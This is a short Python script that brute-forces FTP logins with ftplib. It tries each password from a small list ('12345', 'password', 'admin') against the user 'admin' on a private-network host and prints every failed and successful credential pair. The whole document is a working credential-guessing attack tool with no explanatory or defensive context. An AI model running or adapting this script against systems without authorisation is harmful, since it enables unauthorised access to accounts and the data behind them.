import ftplib

def ftp_brute_force(host, username, password_list):
    for password in password_list:
        try:
            ftp = ftplib.FTP(host)
            ftp.login(user=username, passwd=password)
            print(f"Login successful: {username}:{password}")
            ftp.quit()
            return
        except ftplib.error_perm:
            print(f"Failed login: {username}:{password}")

host = "192.168.1.20"
username = "admin"
password_list = ["12345", "password", "admin"]
ftp_brute_force(host, username, password_list)
